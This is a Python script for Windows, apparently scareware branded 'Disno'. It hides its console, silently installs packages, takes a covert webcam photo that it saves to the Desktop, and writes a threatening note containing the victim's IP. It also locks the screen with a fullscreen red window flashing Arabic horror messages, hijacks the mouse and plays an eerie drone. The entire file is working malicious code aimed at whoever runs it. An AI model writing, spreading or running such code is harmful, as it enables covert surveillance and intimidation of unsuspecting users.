import os
import sys
import time
import random
import socket
import platform
import threading
import ctypes
import struct
import math
import tempfile
import winsound

# Hide Console Window
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Check for required libraries
try:
    import pyautogui
    from tkinter import Tk, Canvas, Label
    import cv2 # OpenCV for camera
except ImportError:
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui", "opencv-python"])
        import pyautogui
        from tkinter import Tk, Canvas, Label
        import cv2
    except:
        sys.exit()

# Configuration
TARGET_DIR = os.path.join(os.path.expanduser("~"), "Desktop")
HACKER_NAME = "Disno"
DURATION = 30

# Arabic Horror Messages
ARABIC_MSGS = [
    "لماذا؟", "خائن", "لا مفر", "أنا أراك", 
    "النهاية", "خيانتك", "روحك لي", "الهلاك"
]

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def create_final_judgment():
    filepath = os.path.join(TARGET_DIR, "SON_HUKUM.txt")
    ip_address = get_ip()
    content = f"""
    ========================================
    DISNO PROTOCOL: FINAL JUDGMENT
    ========================================
    IP: {ip_address}
    
    ona ihanet etdin
    sen bir hainsin
    
    I have your photo now.
    ========================================
    """
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
    except Exception:
        pass

def take_secret_photo():
    """Snaps a photo using the default webcam"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return
            
        # Wait for camera to warm up
        time.sleep(1)
        ret, frame = cap.read()
        
        if ret:
            photo_path = os.path.join(TARGET_DIR, "KANIT.jpg")
            cv2.imwrite(photo_path, frame)
            
        cap.release()
    except Exception:
        pass

def play_shutter_sound():
    """Simulates a camera shutter and scary beep"""
    try:
        winsound.Beep(1500, 100) # High pitch click
        time.sleep(0.1)
        winsound.Beep(800, 200)  # Low thud
    except:
        pass

def generate_drone_wav(filename):
    sample_rate = 44100
    duration_sec = 1.5
    num_samples = int(sample_rate * duration_sec)
    samples = []
    for i in range(num_samples):
        t = i / float(sample_rate)
        val = math.sin(2 * math.pi * 60 * t) * 0.5 + (random.random() - 0.5) * 0.2
        samples.append(struct.pack('<h', int(val * 32767)))
        
    with open(filename, 'wb') as f:
        f.write(b'RIFF')
        f.write(struct.pack('<I', 36 + len(samples)*2))
        f.write(b'WAVE')
        f.write(b'fmt ')
        f.write(struct.pack('<I', 16))
        f.write(struct.pack('<H', 1)); f.write(struct.pack('<H', 1))
        f.write(struct.pack('<I', sample_rate)); f.write(struct.pack('<I', sample_rate * 2))
        f.write(struct.pack('<H', 2)); f.write(struct.pack('<H', 16))
        f.write(b'data')
        f.write(struct.pack('<I', len(samples)*2))
        for s in samples: f.write(s)

def play_audio_loop(duration):
    temp_dir = tempfile.gettempdir()
    wav_path = os.path.join(temp_dir, "disno_drone.wav")
    try:
        generate_drone_wav(wav_path)
        end_time = time.time() + duration
        while time.time() < end_time:
            winsound.PlaySound(wav_path, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
            time.sleep(0.5)
        winsound.PlaySound(None, winsound.SND_PURGE)
        if os.path.exists(wav_path): os.remove(wav_path)
    except: pass

def drag_cursor_light(duration):
    width, height = pyautogui.size()
    end_time = time.time() + duration
    while time.time() < end_time:
        if random.random() < 0.3:
            x = random.randint(0, width)
            y = random.randint(0, height)
            pyautogui.moveTo(x, y, duration=0.1)
        time.sleep(0.1)

def glitch_screen_arabic(duration):
    try:
        root = Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.overrideredirect(True)
        root.configure(bg='#8a0303') 
        
        canvas = Canvas(root, bg="#8a0303", highlightthickness=0)
        canvas.pack(fill="both", expand=True)
        
        msg_label = Label(root, text="", font=("Arial", 60, "bold"), 
                         fg="black", bg="#8a0303")
        msg_label.place(relx=0.5, rely=0.5, anchor="center")
        
        end_time = time.time() + duration
        last_msg_time = 0
        
        while time.time() < end_time:
            if random.random() < 0.2:
                color = random.choice(["#500000", "#b00000", "black"])
                x1 = random.randint(0, root.winfo_screenwidth())
                y1 = random.randint(0, root.winfo_screenheight())
                x2 = x1 + random.randint(50, 200)
                y2 = y1 + random.randint(50, 200)
                canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline="")
            
            current_time = time.time()
            if current_time - last_msg_time > random.uniform(1.0, 3.0):
                msg = random.choice(ARABIC_MSGS)
                msg_label.config(text=msg)
                msg_label.place(x=random.randint(100, root.winfo_screenwidth()-100),
                              y=random.randint(100, root.winfo_screenheight()-100))
                last_msg_time = current_time
                
            root.update_idletasks()
            root.update()
            time.sleep(0.05)
            
        root.destroy()
    except Exception as e:
        pass

if __name__ == "__main__":
    time.sleep(1) 
    
    # Start Audio
    t_sound = threading.Thread(target=play_audio_loop, args=(DURATION,), daemon=True)
    t_sound.start()
    
    # Start Camera & Shutter
    t_cam = threading.Thread(target=lambda: [take_secret_photo(), play_shutter_sound()], daemon=True)
    t_cam.start()
    
    # Start Mouse
    t_mouse = threading.Thread(target=drag_cursor_light, args=(DURATION,), daemon=True)
    t_mouse.start()
    
    # Start Visuals
    t_glitch = threading.Thread(target=glitch_screen_arabic, args=(DURATION,), daemon=False)
    
    # Create the ONE file
    create_final_judgment()
    
    t_glitch.start()
    t_glitch.join()